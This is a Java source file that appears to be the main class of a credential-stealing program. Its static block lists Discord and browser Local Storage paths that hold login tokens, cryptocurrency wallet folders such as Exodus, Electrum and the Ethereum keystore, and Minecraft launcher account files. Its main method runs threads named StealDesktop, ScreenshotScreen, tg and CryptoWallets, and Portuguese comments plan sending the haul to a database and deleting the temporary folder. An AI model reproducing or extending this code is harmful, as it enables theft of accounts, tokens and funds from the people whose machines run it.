package org.example;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class back {

    static String[] DiscordTypes;
    static String ValidTokens;
    static String TokenStrings;
    static String[] Wallets;
    public static String xdFolderPath;
    public static final File localAppData;
    public static final File appData;
    public static final File lunarPath;
    public static final File featherPath;
    public static final File essentialappPath;

    public static void main(String[] args){
        System.out.println("Se pa ta ligado");
        xd();
    }

    public static void xd(){
        ExecutorService ex = Executors.newFixedThreadPool(4);
        ex.submit(() -> zero.StealDesktop());
        ex.submit(() -> zero.ScreenshotScreen());
        ex.submit(() -> zero.tg());
        ex.submit(() -> zero.CryptoWallets());
        ex.shutdown();
        try {
            ex.awaitTermination(1, TimeUnit.MINUTES);
            // mandar para o banco de dados
            // deletar TempGui
        } catch (Exception e) { e.printStackTrace(); }
    }

    static {
        try { xdFolderPath = String.valueOf(Files.createTempDirectory("TempGui"));} catch(IOException e){ throw new RuntimeException(e); }
        appData = new File(System.getenv("APPDATA"));
        localAppData = new File(System.getenv("LOCALAPPDATA"));
        DiscordTypes = new String[]{appData + "\\discord\\Local Storage\\leveldb", appData + "\\discordcanary\\Local Storage\\leveldb", appData + "\\discordptb\\Local Storage\\leveldb", appData + "\\Lightcord\\Local Storage\\leveldb", appData + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb", appData + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb", localAppData + "\\Amigo\\User Data\\Local Storage\\leveldb", localAppData + "\\Torch\\User Data\\Local Storage\\leveldb", localAppData + "\\Kometa\\User Data\\Local Storage\\leveldb", localAppData + "\\Orbitum\\User Data\\Local Storage\\leveldb", localAppData + "\\CentBrowser\\User Data\\Local Storage\\leveldb", localAppData + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb", localAppData + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb", localAppData + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb", localAppData + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb", localAppData + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb", localAppData + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb"};
        DiscordTypes = new String[]{appData + "\\discord\\Local Storage\\leveldb", appData + "\\discordcanary\\Local Storage\\leveldb", appData + "\\discordptb\\Local Storage\\leveldb", appData + "\\Lightcord\\Local Storage\\leveldb", appData + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb", appData + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb", localAppData + "\\Amigo\\User Data\\Local Storage\\leveldb", localAppData + "\\Torch\\User Data\\Local Storage\\leveldb", localAppData + "\\Kometa\\User Data\\Local Storage\\leveldb", localAppData + "\\Orbitum\\User Data\\Local Storage\\leveldb", localAppData + "\\CentBrowser\\User Data\\Local Storage\\leveldb", localAppData + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb", localAppData + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb", localAppData + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb", localAppData + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb", localAppData + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb", localAppData + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb", localAppData + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb"};
        ValidTokens = "";
        TokenStrings = "";
        Wallets = new String[]{appData + "\\Zcash", appData + "\\Armory", appData + "\\Bytecoin", appData + "\\com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb", appData + "\\Exodus\\exodus.wallet", appData + "\\Ethereum\\keystore", appData + "\\Electrum\\wallets", appData + "\\atomic\\Local Storage\\leveldb", appData + "\\Guarda\\Local Storage\\leveldb", localAppData + "\\Coinomi\\Coinomi\\wallets"};
        lunarPath = new File(System.getProperty("user.home") + "\\.lunarclient\\settings\\game\\accounts.json");
        featherPath = new File(appData + "\\.feather\\accounts.json");
        essentialappPath = new File(appData + "\\.minecraft\\essential\\microsoft_accounts.json");
    }
}